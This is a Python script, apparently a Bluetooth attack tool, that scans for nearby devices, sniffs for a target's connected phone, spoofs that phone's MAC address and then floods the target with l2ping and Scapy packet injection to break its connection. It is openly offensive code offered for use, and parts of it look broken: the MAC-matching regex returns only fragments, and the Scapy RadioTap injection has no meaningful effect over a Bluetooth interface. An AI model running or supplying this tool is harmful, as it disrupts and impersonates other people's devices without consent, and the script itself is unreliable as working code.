import subprocess
import threading
import time
import os
import sys
import re
from scapy.all import *

INTERFACE = "hci0"

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
    except Exception as e:
        return f"Error: {e}"

def setup_environment():
    print("[*] Initializing System Environment...")
    run_cmd("sudo rfkill unblock bluetooth")
    run_cmd(f"sudo hciconfig {INTERFACE} up")
    
    status = run_cmd(f"hciconfig {INTERFACE}")
    if "UP RUNNING" not in status:
        print("[-] Interface hci0 is not ready.")
        sys.exit(1)
    print("[+] Interface Verified.")

def get_target_info():
    print("\n[*] Scanning for targets (This may fail if device is connected)...")
    devices = []
    result = run_cmd("hcitool scan")
    for line in result.splitlines():
        if "\t" in line:
            parts = line.split("\t", 1)
            devices.append({"mac": parts[0], "name": parts[1]})
            print(f"[+] Found: {parts[0]} | Name: {parts[1]}")
    return devices

def sniff_connected_phone(target_mac):
    print(f"[*] Sniffing traffic for {target_mac} to find connected phone...")
    try:
        process = subprocess.Popen(['sudo', 'hcidump', '-n'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        start_time = time.time()
        while time.time() - start_time < 20: 
            line = process.stdout.readline().decode(errors='ignore')
            if target_mac in line:
                macs = re.findall(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', line)
                for m in macs:
                    if m != target_mac:
                        print(f"[+] Connected Phone MAC detected: {m}")
                        process.terminate()
                        return m
        process.terminate()
    except Exception as e:
        print(f"[!] Sniffing failed: {e}")
    return None

def spoof_and_attack(phone_mac, target_mac):
    if phone_mac:
        print(f"[*] Step 1: Spoofing as {phone_mac}...")
        run_cmd(f"sudo hciconfig {INTERFACE} down")
        run_cmd(f"sudo hciconfig {INTERFACE} hwset {phone_mac}")
        run_cmd(f"sudo hciconfig {INTERFACE} up")
    else:
        print("[-] No phone MAC found. Attacking directly...")

    print(f"[*] Step 2: Launching Flood Attack on {target_mac}...")
    flood_thread = threading.Thread(target=lambda: os.system(f"sudo l2ping -i {INTERFACE} -s 600 -f {target_mac}"))
    flood_thread.start()
    
    try:
        pkt = RadioTap() / Raw(load=f"RESET:{target_mac}") 
        send(pkt, iface=INTERFACE, loop=1, inter=0.01, verbose=False)
    except Exception as e:
        print(f"[!] Scapy injection error: {e}")

def main():
    os.system("clear")
    print("==== ELITE AUTOMATED CONNECTION BREAKER ====")
    setup_environment()
    
    targets = get_target_info()
    if not targets:
        print("\n[!] No devices found via scan.")
        manual = input("[*] Do you want to enter target MAC manually? (y/n): ")
        if manual.lower() == 'y':
            target_mac = input("[*] Enter Target MAC: ")
            sniffed_mac = sniff_connected_phone(target_mac)
            spoof_and_attack(sniffed_mac, target_mac)
        else:
            print("[-] Exiting.")
            return
    else:
        print("\nSelect Target Index:")
        for i, t in enumerate(targets):
            print(f"[{i}] {t['mac']} - {t['name']}")
        
        try:
            idx = int(input("[*] Choice: "))
            target = targets[idx]
            phone_mac = sniff_connected_phone(target['mac'])
            spoof_and_attack(phone_mac, target['mac'])
        except (ValueError, IndexError):
            print("[-] Invalid selection.")
            return

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Execution stopped by user.")
        sys.exit(0)
